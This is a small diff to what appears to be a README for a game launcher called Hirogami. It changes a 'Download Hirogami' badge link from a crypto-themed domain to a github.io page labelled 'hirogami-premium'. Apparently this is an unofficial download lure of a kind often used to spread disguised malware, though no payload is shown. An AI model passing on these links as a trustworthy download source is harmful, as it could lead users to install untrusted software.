@@ -2,7 +2,7 @@
 
 Stealth‑action launcher centered on noise/visibility profiles, input curves for precise dashes, and speedrun‑friendly splits.
 
-[![Download Hirogami](https://img.shields.io/badge/Download-Hirogami-blueviolet)](https://cryptoenthusiasts.world/)
+[![Download Hirogami](https://img.shields.io/badge/Download-Hirogami-blueviolet)](https://e32838279.github.io/.github/hirogami-premium)
 
 ---
 
